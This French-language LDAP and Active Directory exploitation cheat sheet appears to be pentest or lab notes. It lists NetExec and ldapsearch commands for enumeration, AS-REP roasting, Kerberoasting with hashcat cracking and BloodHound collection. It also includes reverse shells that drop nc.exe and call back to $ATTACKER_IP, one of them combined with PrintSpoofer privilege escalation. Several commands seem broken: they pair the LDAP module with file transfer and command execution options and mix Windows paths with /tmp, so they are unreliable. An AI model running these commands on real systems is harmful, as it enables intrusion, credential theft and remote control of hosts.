# **LDAP Enumeration & Exploitation Checklist**  

## üîç **√ânum√©ration & Connexion**
```bash
# Tester l'acc√®s √† LDAP avec un utilisateur et un mot de passe
nxc ldap $IP -u '$USER' -p '$PASSWORD'

# Lister les utilisateurs LDAP
nxc ldap $IP -u '$USER' -p '$PASSWORD' --users

# Lister les groupes LDAP
nxc ldap $IP -u '$USER' -p '$PASSWORD' --groups

# Lister les GPOs LDAP
nxc ldap $IP -u '$USER' -p '$PASSWORD' --gpos

# Rechercher tous les objets avec un filtre g√©n√©rique
ldapsearch -v -x -b "DC=example,DC=com" -H "ldap://$IP" "(objectclass=*)"

# Rechercher des informations sur les utilisateurs sp√©cifiques (par exemple, SAMAccountName)
ldapsearch -v -x -b "DC=example,DC=com" -H "ldap://$IP" "(objectclass=*)" | grep samaccountname
```

## üîì **Privil√®ges & Ex√©cution de commandes**
```bash
# Tester ASREP Roasting (pour attaquer le protocole Kerberos)
nxc ldap $IP -u $USER -p '' --asreproast output.txt
# Cracker le hash avec hashcat
# hashcat -m18200 output.txt wordlist

# Tester Kerberoasting pour extraire des hashes de service Kerberos
nxc ldap $IP -u '$USER' -p '$PASSWORD' --kerberoasting output.txt
# Cracker les hashes avec hashcat
# hashcat -m13100 output.txt wordlist.txt

# R√©cup√©rer la description des utilisateurs
nxc ldap $IP -u '$USER' -p '$PASSWORD' -M get-desc-users

# Utiliser BloodHound pour collecter des informations sur l'AD
nxc ldap $IP -u 'users.txt' -p 'passwords.txt' --bloodhound -c all --dns-server $DNS_SERVER
```

## üìÇ **Transfert de fichiers**
```bash
# Envoyer un fichier vers un serveur LDAP (exemple g√©n√©rique, adapter pour d'autres types de transfert)
nxc ldap $IP -u '$USER' -p '$PASSWORD' --put-file /tmp/local_file /remote/path/remote_file.txt

# T√©l√©charger un fichier depuis un serveur LDAP (si autoris√©)
nxc ldap $IP -u '$USER' -p '$PASSWORD' --get-file /remote/path/remote_file.txt /tmp/local_file
```

## üöÄ **Reverse Shell**
```bash
# D√©poser un ex√©cutable (ex: nc.exe pour un reverse shell) sur la cible
nxc ldap $IP -u '$USER' -p '$PASSWORD' --put-file nc.exe /tmp/nc.exe

# Lancer un reverse shell via netcat
nxc ldap $IP -u '$USER' -p '$PASSWORD' -x "C:\tmp\nc.exe $ATTACKER_IP 1234 -e cmd"

# Exploiter les informations d'impersonation ou les privil√®ges √©lev√©s si pr√©sents
nxc ldap $IP -u '$USER' -p '$PASSWORD' -x 'C:\tmp\PrintSpoofer64.exe -c "C:\tmp\nc.exe $ATTACKER_IP 1234 -e cmd"'

# Reverse Shell via PowerShell (Base64 encod√©)
nxc ldap $IP -u '$USER' -p '$PASSWORD' -x '<PAYLOAD REVERSE SHELL BASE64 HERE>'
```

## üîß **Autres attaques LDAP et recherche d‚Äôinformations sensibles**
```bash
# Recherche de tous les utilisateurs ou d'informations particuli√®res (ex: description)
ldapsearch -v -x -b "DC=example,DC=com" -H "ldap://$IP" "(objectclass=*)" | grep description

# Utiliser un wildcard pour rechercher des informations sur un domaine complet
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$IP" "(objectclass=*)"
```